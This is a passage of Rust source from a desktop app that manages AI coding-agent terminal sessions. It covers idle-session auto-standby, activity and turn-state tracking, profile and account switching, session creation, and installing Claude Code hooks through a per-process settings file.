            Err(err)
        }
    }
}

// ─────────────────────────────────────────────────────────────────────────
// Auto-standby — config store + (simplified) scheduler: parks inactive sessions after the grace
// period, so only the open session keeps a live PTY.
// ─────────────────────────────────────────────────────────────────────────

/// AutoStandbyConfig (graceMinutes; 0 = "Never", feature off).
#[derive(Clone, Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
pub struct AutoStandbyConfig {
    pub grace_minutes: u32,
}

impl Default for AutoStandbyConfig {
    fn default() -> Self {
        Self { grace_minutes: 60 }
    }
}

const MAX_GRACE_MINUTES: u32 = 240;
/// Scheduler re-evaluation cadence.
const AUTO_STANDBY_EVAL_MS: u64 = 15_000;
/// PTY output younger than this = session still working.
const OUTPUT_QUIET_MS: u64 = 60_000;

fn auto_standby_config_path() -> std::path::PathBuf {
    crate::commands::hook::hook_data_dir().join("auto-standby-config.json")
}

fn read_auto_standby_config() -> AutoStandbyConfig {
    std::fs::read_to_string(auto_standby_config_path())
        .ok()
        .and_then(|raw| serde_json::from_str::<AutoStandbyConfig>(&raw).ok())
        .map(|mut c| {
            c.grace_minutes = c.grace_minutes.min(MAX_GRACE_MINUTES);
            c
        })
        .unwrap_or_default()
}

/// `{ ok, config }` envelope: the webapp discards the
/// response if `res.ok` is missing (loadAutoStandbyConfig).
#[derive(Serialize)]
pub struct AutoStandbyConfigResult {
    pub ok: bool,
    pub config: AutoStandbyConfig,
}

/// auto-standby:get-config.
#[tauri::command]
pub fn auto_standby_get_config() -> AutoStandbyConfigResult {
    AutoStandbyConfigResult {
        ok: true,
        config: read_auto_standby_config(),
    }
}

/// auto-standby:set-config (clamp 0..=240 like clampGraceMinutes).
#[tauri::command]
pub fn auto_standby_set_config(config: AutoStandbyConfig) -> AutoStandbyConfigResult {
    let clamped = AutoStandbyConfig {
        grace_minutes: config.grace_minutes.min(MAX_GRACE_MINUTES),
    };
    let path = auto_standby_config_path();
    if let Some(dir) = path.parent() {
        let _ = std::fs::create_dir_all(dir);
    }
    if let Ok(json) = serde_json::to_string_pretty(&clamped) {
        let _ = std::fs::write(&path, json);
    }
    AutoStandbyConfigResult {
        ok: true,
        config: clamped,
    }
}

// ── Activity monitor: "clean" states from hooks + PTY output ─────────
//
// A single model for sessions and sub-agents (as in herdr, "one authority per
// pane"):
//   idle          live PTY, no turn in progress (boot, after Stop+silence)
//   in_progress   turn open (UserPromptSubmit/tool-use, or sustained output)
//   waiting_input human input needed (permission/idle_prompt/elicitation)
//   completed     Stop received: turn closed, not yet reviewed
//   running       legacy: no one sets it anymore, treated as idle
// With hooks (Claude) PTY activity can only CLOSE a turn (Stop
// lost or unattributed), never open it. Without hooks (Codex, Gemini, shell…)
// sustained output opens it and silence closes it.

/// PTY silence after which an open turn is considered closed. Provider
/// TUIs animate spinners/timers while working (output every
/// fraction of a second): 10 s of silence = no turn in progress.
pub(crate) const ACTIVITY_QUIET_MS: u64 = 10_000;
const ACTIVITY_TICK_MS: u64 = 1_000;
/// Consecutive ticks with output before opening a turn: filters one-shot
/// repaints (resize, focus, mouse, post-sleep re-base).
const ACTIVITY_PROMOTE_TICKS: u8 = 2;

fn provider_has_hooks(provider: &str) -> bool {
    provider == "claude-code-cli"
}

/// Transition decided by the monitor for a current state, or None.
pub(crate) fn next_activity_status(
    status: &str,
    provider: &str,
    active: bool,
    active_ticks: u8,
    quiet: bool,
) -> Option<&'static str> {
    match status {
        "in_progress" | "running" if quiet => Some("idle"),
        "idle" | "completed" | "running"
            if !provider_has_hooks(provider)
                && active
                && active_ticks >= ACTIVITY_PROMOTE_TICKS =>
        {
            Some("in_progress")
        }
        _ => None,
    }
}

#[derive(Default)]
struct ActivityTrack {
    last_output_ms: u64,
    active_ticks: u8,
    /// Start of the turn opened by the monitor (0 = no turn).
    turn_started_ms: u64,
    /// last_output_ms at which the foreground was found NOT to be the shell: with
    /// an unchanged screen it is not rechecked on every tick.
    fg_busy_at_output_ms: u64,
}

/// Is the PTY's foreground process the root shell? Some(true) = shell
/// (the provider exited), Some(false) = a program, None = not
/// determinable (remote, Windows) → the caller does not touch the state. It is the
/// deterministic confirmation of the heuristic on the visible prompt.
fn foreground_is_shell(pty: &SessionPty) -> Option<bool> {
    // PTY root shell = session leader: its pgid is the terminal's
    // sid. Foreground == sid → the shell took the terminal back; a
    // provider (even one launched by a wrapper script) has its own pgid.
    #[cfg(unix)]
    {
        let PtyBacking::Local(pair) = &pty.backing else {
            return None;
        };
        let fg = pair.master.process_group_leader()?;
        let fd = pair.master.as_raw_fd()?;
        let sid = unsafe { libc::tcgetsid(fd) };
        if sid <= 0 || fg <= 0 {
            return None;
        }
        Some(fg == sid)
    }
    #[cfg(not(unix))]
    {
        let _ = pty;
        None
    }
}

/// Turn shorter than this = typing echo or repaint, not work.
const ACTIVITY_COMPLETED_MIN_TURN_MS: u64 = 8_000;
/// "Finished" notification only for long turns (the user got distracted).
const ACTIVITY_NOTIFY_MIN_TURN_MS: u64 = 20_000;

/// Turn closing for providers WITHOUT hooks (codex, gemini, …): a
/// real turn becomes `completed` like Claude's Stop hook — before, it always
/// ended in `idle`, so a finished Codex stayed "green as if working"
/// (UX audit 10/2026). generic-shell has no agents: it stays idle.
pub(crate) fn close_turn_status(provider: &str, turn_ms: u64) -> &'static str {
    // The claude family (zai/kimi included) and providers with a native hook (gemini,
    // antigravity…) already signal the end on their own: no duplicates.
    let reports_own_stop = provider_has_hooks(provider)
        || provider_resume_family(provider) == "claude-code-cli"
        || crate::commands::hook::native_hook_flavor(provider).is_some();
    if provider != "generic-shell" && !reports_own_stop && turn_ms >= ACTIVITY_COMPLETED_MIN_TURN_MS
    {
        "completed"
    } else {
        "idle"
    }
}

/// Is the provider still alive in the PTY? The session is a login shell in which the
/// provider is TYPED: if it exits (broken binary, "Please restart Codex",
/// Ctrl+C) the shell stays and no PTY exit arrives. On a still screen, a
/// visible shell prompt = agent exited (`error` if the tail shows a
/// launch error); when the TUI comes back, we restart from idle.
pub(crate) fn provider_presence_status(
    status: &str,
    provider: &str,
    quiet: bool,
    at_shell: bool,
    tail_error: bool,
) -> Option<&'static str> {
    if provider == "generic-shell" || !quiet {
        return None;
    }
    match (at_shell, status) {
        (true, "exited" | "error") => None,
        (true, _) => Some(if tail_error { "error" } else { "exited" }),
        (false, "exited" | "error") => Some("idle"),
        _ => None,
    }
}

/// Launch error in the terminal tail (e.g. "Error: claude native
/// binary not installed", "command not found").
fn launch_error_in_tail(buf: &[u8]) -> bool {
    // Only the last lines above the prompt: the last screen of the TUI just
    // closed (agent output with "error:" & co.) must not count as a
    // launch error.
    let start = buf.len().saturating_sub(1_500);
    let tail = strip_ansi(&String::from_utf8_lossy(&buf[start..])).to_lowercase();
    let lines: Vec<&str> = tail
        .lines()
        .map(str::trim)
        .filter(|l| !l.is_empty())
        .collect();
    let above_prompt = lines.iter().rev().skip(1).take(3);
    above_prompt.into_iter().any(|l| {
        [
            "not installed",
            "command not found",
            "no such file or directory",
            "error: ",
        ]
        .iter()
        .any(|p| l.contains(p))
    })
}

/// Monitor thread (1 s tick) over main sessions and sub-agents.
pub fn start_activity_monitor(
    app: tauri::AppHandle,
    sessions: Arc<SessionManager>,
    subagents: Arc<crate::commands::subagent::SubAgentManager>,
) {
    std::thread::spawn(move || {
        let mut track: HashMap<String, ActivityTrack> = HashMap::new();
        let mut sub_track: HashMap<String, crate::commands::subagent::SubActivity> = HashMap::new();
        loop {
            std::thread::sleep(Duration::from_millis(ACTIVITY_TICK_MS));
            let now = epoch_ms();
            {
                let mut guard = sessions.state.lock();
                track.retain(|id, _| guard.sessions.contains_key(id));
                let mut changes: Vec<(String, &'static str)> = Vec::new();
                // (session id, title, body) — sent outside the lock.
                let mut notices: Vec<(String, String, String)> = Vec::new();
                for s in guard.sessions.values() {
                    let Some(pty) = s.pty.as_ref() else { continue };
                    // Sub-agent children are tracked by SubAgentManager.
                    if s.standby_at.is_some() || s.name.starts_with("[sub]") {
                        continue;
                    }
                    let last = pty
                        .last_output_ms
                        .load(std::sync::atomic::Ordering::Relaxed);
                    let t = track.entry(s.id.clone()).or_insert_with(|| ActivityTrack {
                        last_output_ms: last,
                        active_ticks: 0,
                        turn_started_ms: 0,
                        fg_busy_at_output_ms: 0,
                    });
                    let active = last != t.last_output_ms;
                    t.last_output_ms = last;
                    t.active_ticks = if active {
                        t.active_ticks.saturating_add(1)
                    } else {
                        0
                    };
                    let quiet = now.saturating_sub(last) >= ACTIVITY_QUIET_MS;
                    let label = || crate::commands::providers::provider_display_name(&s.provider);
                    let body = || {
                        let ws = s.config.cwd.as_deref().map(basename).unwrap_or_default();
                        format!("Workspace: {ws}\nSession: {}", s.name)
                    };
                    // try_lock: never block the monitor (nor invert the lock
                    // order) to read the buffer.
                    let presence = if quiet && s.provider != "generic-shell" {
                        pty.buffer.try_lock().and_then(|b| {
                            provider_presence_status(
                                &s.status,
                                &s.provider,
                                quiet,
                                crate::commands::subagent::shell_prompt_visible(&b.data),
                                launch_error_in_tail(&b.data),
                            )
                        })
                    } else {
                        None
                    };
                    // "Exited"/"error" only with confirmation from the foreground
                    // process: a TUI whose last line looks like a
                    // shell prompt must never be reported as exited.
                    let presence = match presence {
                        Some(next @ ("exited" | "error")) => {
                            if t.fg_busy_at_output_ms == last {
                                None
                            } else if foreground_is_shell(pty) == Some(true) {
                                Some(next)
                            } else {
                                t.fg_busy_at_output_ms = last;
                                None
                            }
                        }
                        other => other,
                    };
                    if let Some(next) = presence {
                        t.turn_started_ms = 0;
                        if next == "error" {
                            notices.push((
                                s.id.clone(),
                                format!("{} stopped with an error", label()),
                                body(),
                            ));
                        }
                        changes.push((s.id.clone(), next));
                        continue;
                    }
                    if let Some(mut next) =
                        next_activity_status(&s.status, &s.provider, active, t.active_ticks, quiet)
                    {
                        if next == "in_progress" {
                            t.turn_started_ms = now;
                        } else if next == "idle" && t.turn_started_ms > 0 {
                            let turn_ms = last.saturating_sub(t.turn_started_ms);
                            t.turn_started_ms = 0;
                            next = close_turn_status(&s.provider, turn_ms);
                            if next == "completed" && turn_ms >= ACTIVITY_NOTIFY_MIN_TURN_MS {
                                notices.push((
                                    s.id.clone(),
                                    format!("{} has finished", label()),
                                    body(),
                                ));
                            }
                        }
                        changes.push((s.id.clone(), next));
                    }
                }
                for (id, status) in changes {
                    SessionManager::update_status_locked(&mut guard, &id, status);
                }
                drop(guard);
                for (id, title, body) in notices {
                    crate::commands::hook::show_system_notification(&app, &title, &body, Some(&id));
                }
            }
            subagents.activity_tick(&app, now, &mut sub_track);
        }
    });
}

/// Starts the auto-standby scheduler (thread, eval every 15s).
///
/// It NEVER parks: the active session (FocusManager), generic-shell (killing
/// the PTY would kill user processes like dev servers), sub-agents
/// (`[sub]`), already parked or PTY-less ones, status `running`, recent PTY
/// output (<60s) or sessions with live sub-agents.
///
/// TODO: advanced busy signals are missing (background-task
/// marker + process-tree, retry at 60s). Recent tool use is
/// covered by the `running` status flipped by the hook server; post-sleep
/// re-base is handled below (wall-clock tick gap, no powerMonitor).
pub fn start_auto_standby_scheduler(
    app: tauri::AppHandle,
    sessions: Arc<SessionManager>,
    subagents: Arc<crate::commands::subagent::SubAgentManager>,
    focus: Arc<crate::commands::workspace::FocusManager>,
) {
    std::thread::spawn(move || {
        let mut last_tick_ms = epoch_ms();
        loop {
            std::thread::sleep(Duration::from_millis(AUTO_STANDBY_EVAL_MS));

            // Post-sleep re-base: a tick that
            // arrives very late = the system slept. last_output_ms is
            // wall-clock, so on resume quiet_for would include the whole night
            // and EVERY session would be mass-parked. Refresh the
            // timestamps of live sessions and skip the round.
            let now_ms = epoch_ms();
            let slept = now_ms.saturating_sub(last_tick_ms) > AUTO_STANDBY_EVAL_MS * 3;
            last_tick_ms = now_ms;
            // Autosave of live sessions' screens (crash/force-quit safety),
            // whether auto-standby is on or off.
            sessions.autosave_live_buffers();
            if slept {
                let guard = sessions.state.lock();
                for s in guard.sessions.values() {
                    if let Some(pty) = &s.pty {
                        pty.last_output_ms
                            .store(now_ms, std::sync::atomic::Ordering::Relaxed);
                    }
                }
                continue;
            }

            let config = read_auto_standby_config();
            if config.grace_minutes == 0 {
                continue; // "Never": feature off.
            }
            let grace_ms = u64::from(config.grace_minutes) * 60_000;
            let now = epoch_ms();
            // The renderer keeps the ULID dbId for restored/woken sessions (see
            // resolve_local_id): without resolution the focus id never matches
            // s.id and the ACTIVE session would be parked after the grace.
            // Resolved here, outside the lock taken below.
            let active = focus
                .get_active()
                .session_id
                .map(|a| sessions.resolve_local_id(&a).unwrap_or(a));

            // Snapshot of candidates outside the standby() lock.
            let candidates: Vec<String> = {
                let guard = sessions.state.lock();
                guard
                    .sessions
                    .values()
                    .filter(|s| {
                        let is_active = active
                            .as_deref()
                            .map(|a| a == s.id || a == s.name)
                            .unwrap_or(false);
                        let quiet_for = s
                            .pty
                            .as_ref()
                            .map(|p| {
                                now.saturating_sub(
                                    p.last_output_ms.load(std::sync::atomic::Ordering::Relaxed),
                                )
                            })
                            .unwrap_or(0);
                        !is_active
                            && s.provider != "generic-shell"
                            && !s.name.starts_with("[sub]")
                            && s.standby_at.is_none()
                            && s.pty.is_some()
                            && s.status != "running"
                            && s.status != "in_progress"
                            && quiet_for > OUTPUT_QUIET_MS
                            && quiet_for > grace_ms
                    })
                    .map(|s| s.id.clone())
                    .collect()
            };

            for id in candidates {
                if subagents.has_active_children(&id) {
                    continue;
                }
                eprintln!("[AutoStandby] parking inactive session {id}");
                let _ = sessions.standby(&app, &id);
            }
        } // loop
    });
}

// ─────────────────────────────────────────────────────────────────────────
// Session profiles — active profile store + profile switch (simplified).
// ─────────────────────────────────────────────────────────────────────────

fn active_profile_path() -> std::path::PathBuf {
    crate::commands::hook::hook_data_dir().join("session-profile.json")
}

/// ActiveProfileStore.get — id persisted per device (None = Standard).
pub fn read_active_profile() -> Option<String> {
    std::fs::read_to_string(active_profile_path())
        .ok()
        .and_then(|raw| serde_json::from_str::<JsonValue>(&raw).ok())
        .and_then(|v| {
            v.get("activeProfileId")
                .and_then(|p| p.as_str())
                .map(str::to_string)
        })
        .filter(|s| !s.is_empty())
}

/// ActiveProfileStore.set — None clears it (back to Standard).
fn write_active_profile(profile_id: &Option<String>) {
    let path = active_profile_path();
    match profile_id {
        Some(id) => {
            if let Some(dir) = path.parent() {
                let _ = std::fs::create_dir_all(dir);
            }
            let _ = std::fs::write(
                &path,
                serde_json::json!({ "activeProfileId": id }).to_string(),
            );
        }
        None => {
            let _ = std::fs::remove_file(&path);
        }
    }
}

/// session-profile:get-active.
#[tauri::command]
pub fn session_profile_get_active(
    manager: tauri::State<'_, Arc<SessionManager>>,
) -> Option<String> {
    manager.get_active_profile_id()
}

/// session-profile:set-active — profile switch: persist the current
/// profile to the local store → teardown (stored records intact) → activate
/// the target → restore its sessions → `session-profile:changed`.
///
/// TODO: also handle sub-agent parked-stash/tombstones
/// (suppressStashPush) — not implemented yet.
#[tauri::command]
pub async fn session_profile_set_active(
    app: tauri::AppHandle,
    manager: tauri::State<'_, Arc<SessionManager>>,
    subagents: tauri::State<'_, Arc<crate::commands::subagent::SubAgentManager>>,
    profile_id: Option<String>,
) -> Result<JsonValue, String> {
    use tauri::Emitter;

    let manager = manager.inner().clone();
    let subagents = subagents.inner().clone();
    let normalized = profile_id.filter(|s| !s.is_empty());

    tauri::async_runtime::spawn_blocking(move || {
        let current = manager.get_active_profile_id();
        if normalized == current {
            return serde_json::json!({ "ok": true, "activeProfileId": current });
        }

        // 1. Persist the current profile's sessions (the store is the source of truth).
        let subs = subagents.archived_snapshot_json();
        let _ = manager.save_all_to_store(&subs);

        // 2. LOCAL-only teardown: stored records stay. Sub-agents
        //    die silently with suppress on
        //    (suppressStashPush): no events or pushes, or the destroy
        //    burst would wipe the other profile's localStorage mirror.
        subagents.set_suppress_push(true);
        crate::commands::subagent::teardown_all(&subagents);
        manager.destroy_all_local();
        subagents.set_suppress_push(false);

        // 3. Activate the target (per-device persist + API header) and restore.
        write_active_profile(&normalized);
        manager.set_active_profile_id(normalized.clone());
        let _ = manager.restore_from_store();

        // 4. The renderer reloads the list (now scoped to the profile).
        let _ = app.emit(
            "session-profile:changed",
            serde_json::json!({ "activeProfileId": normalized }),
        );
        serde_json::json!({ "ok": true, "activeProfileId": normalized })
    })
    .await
    .map_err(|e| e.to_string())
}

/// Result of session_account_check: the session follows the active account but
/// its conversation belongs to another account (switch from AI Accounts).
#[derive(Serialize, Default)]
#[serde(rename_all = "camelCase")]
pub struct SessionAccountCheck {
    pub mismatch: bool,
    pub provider: String,
    /// "" = default config (no PromptOps account).
    pub session_account_id: Option<String>,
    pub session_account_name: Option<String>,
    pub current_account_id: Option<String>,
    pub current_account_name: Option<String>,
}

/// Pure comparison: `pinned` = the session has an explicit account or the
/// opt-out (the resume always uses that one, no conflict).
pub(crate) fn account_mismatch(
    pinned: bool,
    session_account: Option<&str>,
    current: Option<&str>,
) -> bool {
    match (pinned, session_account) {
        (false, Some(s)) => s != current.unwrap_or(""),
        _ => false,
    }
}

/// session:account-check — does the conversation belong to an account other
/// than the one the next resume would use? A claude conversation lives in the
/// account's config dir: it cannot be reopened on another one.
#[tauri::command]
pub fn session_account_check(
    manager: tauri::State<'_, Arc<SessionManager>>,
    session_id: String,
) -> SessionAccountCheck {
    let resolved = manager.resolve_local_id(&session_id).unwrap_or(session_id);
    let Some((provider, pinned, launched, sid)) =
        manager.state.lock().sessions.get(&resolved).map(|s| {
            (
                s.provider.clone(),
                s.config.provider_account_id.is_some(),
                s.config.launched_provider_account_id.clone(),
                s.claude_session_id.clone(),
            )
        })
    else {
        return SessionAccountCheck::default();
    };
    let current = crate::commands::provider_account::active_account(&provider);
    let current_id = current.as_ref().map(|(id, _)| id.as_str());
    let session_account = if pinned {
        None
    } else if launched.is_some() {
        launched
    } else if provider == "claude-code-cli" {
        // Launched before the account was recorded: the transcript tells.
        sid.filter(|s| is_safe_session_id(s)).and_then(|s| {
            crate::commands::provider_account::claude_transcript_owner(&s, current_id)
        })
    } else {
        None
    };
    let mismatch = account_mismatch(pinned, session_account.as_deref(), current_id);
    SessionAccountCheck {
        mismatch,
        session_account_name: session_account
            .as_deref()
            .filter(|id| !id.is_empty())
            .and_then(crate::commands::provider_account::account_name),
        session_account_id: session_account,
        current_account_id: current.as_ref().map(|(id, _)| id.clone()),
        current_account_name: current.map(|(_, name)| name),
        provider,
    }
}

/// session:prepare-account-relaunch — parks the session (the PTY carries the
/// old account's env) and marks the next wake as a new conversation: the
/// renderer then runs the normal wake, which starts on the active account.
#[tauri::command]
pub fn session_prepare_account_relaunch(
    app: tauri::AppHandle,
    manager: tauri::State<'_, Arc<SessionManager>>,
    session_id: String,
) -> JsonValue {
    let resolved = manager.resolve_local_id(&session_id).unwrap_or(session_id);
    if !manager.has_session(&resolved) {
        return serde_json::json!({ "ok": false, "error": "Session not found" });
    }
    if !manager.is_standby(&resolved) {
        manager.standby(&app, &resolved);
    }
    // PTY already gone (failed spawn): without standby_at the wake would be a no-op.
    manager.mark_for_respawn(&resolved);
    manager.state.lock().fresh_relaunch.insert(resolved.clone());
    serde_json::json!({ "ok": true, "sessionId": resolved })
}

/// session:apply-account-to-workspace.
#[tauri::command]
pub fn session_apply_account_to_workspace(
    manager: tauri::State<'_, Arc<SessionManager>>,
    workspace_id: Option<String>,
    provider: String,
    provider_account_id: Option<String>,
    inherit: Option<bool>,
) -> JsonValue {
    // explicit inherit = remove the pin (IPC drops undefined values).
    let account = if inherit.unwrap_or(false) {
        None
    } else {
        Some(provider_account_id)
    };
    let updated =
        manager.apply_provider_account_to_workspace(workspace_id.as_deref(), &provider, account);
    serde_json::json!({ "ok": true, "updatedSessionIds": updated })
}

// ─────────────────────────────────────────────────────────────────────────
// Terminal flags (app settings) — stored for the future
// native SessionTailer/engine. TODO: no consumer reads them today.
// ─────────────────────────────────────────────────────────────────────────

/// (commandDetection, inputDetection, activityTail, safeMode).
static TERMINAL_FLAGS: Mutex<(bool, bool, bool, bool)> = Mutex::new((true, true, true, false));

/// app:set-terminal-detection.
#[tauri::command]
pub fn app_set_terminal_detection(
    command_detection: Option<bool>,
    input_detection: Option<bool>,
    activity_tail: Option<bool>,
) -> JsonValue {
    let mut flags = TERMINAL_FLAGS.lock();
    if let Some(v) = command_detection {
        flags.0 = v;
    }
    if let Some(v) = input_detection {
        flags.1 = v;
    }
    if let Some(v) = activity_tail {
        flags.2 = v;
    }
    serde_json::json!({ "ok": true })
}

/// app:set-terminal-safe-mode — effect only on Windows (tailer pause).
#[tauri::command]
pub fn app_set_terminal_safe_mode(enabled: bool) -> JsonValue {
    if !cfg!(windows) {
        return serde_json::json!({ "ok": true, "applied": false });
    }
    TERMINAL_FLAGS.lock().3 = enabled;
    serde_json::json!({ "ok": true, "applied": true, "enabled": enabled })
}

/// provider:check — checks whether the provider's CLI binary is on PATH.
/// `session_id` (Windows): a WSL/Git Bash session probes the CLI INSIDE
/// that environment, not on the host — without it, the "install claude" wizard
/// showed up (and installed on Windows) even with claude in the distro.
#[tauri::command]
pub async fn provider_check(
    app: tauri::AppHandle,
    provider: String,
    force: Option<bool>,
    session_id: Option<String>,
) -> ProviderCheckResult {
    // AppHandle (owned) and not State<'_>: an async command without Result cannot
    // take arguments with lifetimes (Tauri's 'static constraint).
    let shell = session_id.as_deref().and_then(|id| {
        use tauri::Manager;
        app.state::<Arc<SessionManager>>().effective_shell_of(id)
    });
    // spawn_blocking: an expired cache pays for blocking which + login-shell probes,
    // and it fires on every active session change — never on the async worker.
    let fallback_provider = provider.clone();
    tauri::async_runtime::spawn_blocking(move || {
        // force ("I've installed" button): bypasses the 5-min cache.
        if force == Some(true) {
            invalidate_provider_check(&provider);
        }
        check_provider_in_shell(&provider, shell.as_deref())
    })
    .await
    .unwrap_or_else(|_| ProviderCheckResult {
        // Join error: unknown outcome → NOT installed (fail-closed: a provider
        // marked INSTALLED that isn't there is the parachute that doesn't open).
        installed: false,
        platform: platform_str(),
        command: String::new(),
        provider: fallback_provider,
    })
}

// ─────────────────────────────────────────────────────────────────────────
// Core: create_session — session creation + PTY spawn.
// ─────────────────────────────────────────────────────────────────────────

fn create_session(
    app: &tauri::AppHandle,
    manager: &Arc<SessionManager>,
    request: CreateSessionRequest,
    on_output: Channel<InvokeResponseBody>,
    on_status: Channel<SessionStatusChange>,
) -> Result<SessionSummary, String> {
    // Arm the periodic prompt-count flusher (idempotent).
    manager.ensure_sync_timer();

    let is_sub_agent = request
        .name
        .as_deref()
        .map(|n| n.starts_with("[sub]"))
        .unwrap_or(false);

    let id = Uuid::new_v4().to_string();
    let now = now_iso();
    let mut config = request.config.clone().unwrap_or_default();
    if config.token_history_id.is_none() {
        config.token_history_id = Some(id.clone());
    }
    let workspace = config.cwd.as_ref().map(|cwd| WorkspaceBinding {
        path: cwd.clone(),
        name: basename(cwd),
    });
    let provider = request.provider.clone();
    let default_name = format!("{}-{}", provider, &id[..id.len().min(6)]);
    let name = request.name.clone().unwrap_or(default_name);
    let workspace_id = request.workspace_id.clone().flatten();

    let mut session = AgentSession {
        id: id.clone(),
        name: name.clone(),
        provider: provider.clone(),
        status: "idle".into(),
        config: config.clone(),
        workspace: workspace.clone(),
        workspace_id: workspace_id.clone(),
        claude_session_id: None,
        parent_session_id: request.parent_session_id.clone(),
        created_at: now.clone(),
        updated_at: now.clone(),
        history: vec![SessionEvent {
            timestamp: now.clone(),
            event_type: "created".into(),
            data: None,
        }],
        pending_interactions: Vec::new(),
        view_state: None,
        has_terminal: false,
        pty: None,
        standby_at: None,
        parked_buffer: None,
    };

    // Dedup by name and insert, under ONE lock: two creates with the same name
    // arriving together must end in one session, never two sessions bound to
    // the same stored record. The channel must be REPLACED on every create:
    // after a webview reload the old one is dead but would stay Some — all
    // status pushes would go nowhere.
    {
        let copy = AgentSession {
            id: session.id.clone(),
            name: session.name.clone(),
            provider: session.provider.clone(),
            status: session.status.clone(),
            config: session.config.clone(),
            workspace: session.workspace.clone(),
            workspace_id: session.workspace_id.clone(),
            claude_session_id: session.claude_session_id.clone(),
            parent_session_id: session.parent_session_id.clone(),
            created_at: session.created_at.clone(),
            updated_at: session.updated_at.clone(),
            history: session.history.clone(),
            pending_interactions: session.pending_interactions.clone(),
            view_state: session.view_state.clone(),
            has_terminal: false,
            pty: None,
            standby_at: None,
            parked_buffer: None,
        };
        if let Some(existing) = manager.insert_or_existing(copy, !is_sub_agent) {
            return Ok(existing);
        }
        manager.state.lock().status_channel = Some(on_status.clone());
    }

    // Spawn the provider in the PTY (best-effort, like createSession try/catch).
    let spawn_result = spawn_session_pty(app, manager, &id, &provider, &config, on_output);

    match spawn_result {
        Ok(()) => {
            // Live PTY = "idle": "running" (green) stayed on even with the
            // session idle because no Stop turned it off. A park that arrived
            // meanwhile keeps its own state.
            manager.mark_pty_live(&id);
            // No `.gitignore` edit here: opening a session must not modify the
            // user's repository. Features that do write PromptOps files into
            // the workspace (session assets) add their own entries when they
            // write them.
        }
        Err(err) => {
            let mut guard = manager.state.lock();
            if let Some(s) = guard.sessions.get_mut(&id) {
                s.history.push(SessionEvent {
                    timestamp: now_iso(),
                    event_type: "error".into(),
                    data: Some(serde_json::json!(err)),
                });
            }
            SessionManager::update_status_locked(&mut guard, &id, "error");
            drop(guard);
            eprintln!("Failed to spawn session: {err}");
            // Auto-cleanup: a session born dead destroys itself after
            // 5 minutes if it stays in error (destroy timer;
            // skip_api=true — the stored record, if any, stays).
            let cleanup_manager = Arc::clone(manager);
            let cleanup_id = id.clone();
            std::thread::spawn(move || {
                std::thread::sleep(std::time::Duration::from_secs(300));
                let still_error = cleanup_manager
                    .state
                    .lock()
                    .sessions
                    .get(&cleanup_id)
                    .map(|s| s.status == "error")
                    .unwrap_or(false);
                if still_error {
                    let _ = cleanup_manager.destroy(&cleanup_id, true);
                }
            });
        }
    }

    // Update the local snapshot for the returned summary.
    {
        let guard = manager.state.lock();
        if let Some(s) = guard.sessions.get(&id) {
            session.status = s.status.clone();
        }
    }
    let summary = session.to_summary();

    // There is no dedicated 'session:created' channel;
    // the renderer learns about the new session from the return value + session:status.

    // Local store sync (fire-and-forget). Skipped for sub-agents and in restore.
    if !is_sub_agent && !request.skip_api_create {
        schedule_store_create(manager, &id, 0);
    }

    Ok(summary)
}

fn provider_home_for_config(
    provider: &str,
    provider_account_id: Option<Option<String>>,
) -> Option<String> {
    crate::commands::provider_account::resolve_account_env(provider, provider_account_id).and_then(
        |(env_var, config_dir, _)| {
            // Codex reads CODEX_HOME, the claude family CLAUDE_CONFIG_DIR: both
            // move the transcripts the model badge and the handoff read.
            matches!(env_var, Some("CODEX_HOME") | Some("CLAUDE_CONFIG_DIR")).then_some(config_dir)
        },
    )
}

// ── Claude Code hooks per process ─────────────────────────────────────────
//
// The hooks used to be merged into `<repo>/.claude/settings.local.json` on every
// spawn: a file in the user's repository, removed only when the folder's last
// session closed (so it stayed after a quit or a crash, with a stale port).
// Claude Code accepts `--settings <file>` ("additional settings"; hooks from
// every source run), so the hooks now live in ONE file in the app data folder
// and every claude launch line points at it. The repository is not touched.
// Fallback to the old file only when the installed claude has no `--settings`
// or for WSL sessions (the path would need translating into the distro).

/// The hooks file passed to claude with `--settings`.
pub(crate) fn process_hook_settings_path() -> std::path::PathBuf {
    crate::commands::hook::hook_data_dir()
        .join("hooks")
        .join("claude-settings.json")
}

/// Does the installed claude accept `--settings`? Probed once per run; when
/// in doubt, no (an unknown flag would stop the CLI from starting).
pub(crate) fn claude_supports_settings_flag() -> bool {
    static SUPPORTED: std::sync::OnceLock<bool> = std::sync::OnceLock::new();
    !cfg!(test) && *SUPPORTED.get_or_init(|| cli_help_mentions("claude", "--settings"))
}

/// Same hook entries `hook::write_hook_settings` merges into the repository
/// file (command hook through the shim, or HTTP hook with the session headers).
pub(crate) fn claude_hooks_json(
    hook_script_path: &str,
    hook_port: u16,
    use_http: bool,
) -> JsonValue {
    serde_json::json!({
        "hooks": crate::commands::hook::claude_hook_events(hook_script_path, hook_port, use_http, None)
    })
}

/// A path that can sit inside double quotes on zsh/bash/PowerShell as is.
fn quotable_path(path: &str) -> bool {
    !path.is_empty()
        && !path
            .chars()
            .any(|c| matches!(c, '"' | '$' | '`' | '\n' | '\r' | '%'))
}

/// Writes the hooks file for `--settings` (owner-only, atomic).
fn write_process_hook_settings(
    hook_script_path: &str,
    hook_port: u16,
    use_http: bool,
) -> Result<(), String> {
    let path = process_hook_settings_path();
    if !quotable_path(&path.to_string_lossy()) {
        return Err("hooks path cannot be quoted on the command line".into());
    }
    if let Some(dir) = path.parent() {
        crate::local_store::create_private_dir(dir)?;
    }
    let body = serde_json::to_vec_pretty(&claude_hooks_json(hook_script_path, hook_port, use_http))
        .map_err(|e| e.to_string())?;
    crate::local_store::replace_file_private(&path, &body)
}

/// Installs the PromptOps hooks for a claude process started in `cwd`:
/// through `--settings` when possible, else (older claude) in the
/// repository's `.claude/settings.local.json` as before.
pub(crate) fn install_claude_hooks(cwd: &str, hook_script_path: &str, hook_port: u16) {
    let http = crate::commands::hook::claude_supports_http_hooks_on_windows();
    if claude_supports_settings_flag() {
        match write_process_hook_settings(hook_script_path, hook_port, http) {
            Ok(()) => return,
            Err(err) => eprintln!(
                "[hooks] per-process settings not written ({err}): using the workspace file"
            ),
        }
    }
    if let Err(err) =
        crate::commands::hook::write_hook_settings(cwd, hook_script_path, hook_port, http, None)
    {
        eprintln!("[hooks] write settings failed: {err}");
    }
}

/// `--settings "<file>"` for a local claude-code-cli launch, when the hooks
/// file was written this run. Empty otherwise (remote hosts, other providers,
/// older CLIs: the launch line stays as it was).
pub(crate) fn claude_settings_fragment(provider: &str) -> Option<String> {
    if provider != "claude-code-cli" || !claude_supports_settings_flag() {
        return None;
    }
    let path = process_hook_settings_path();
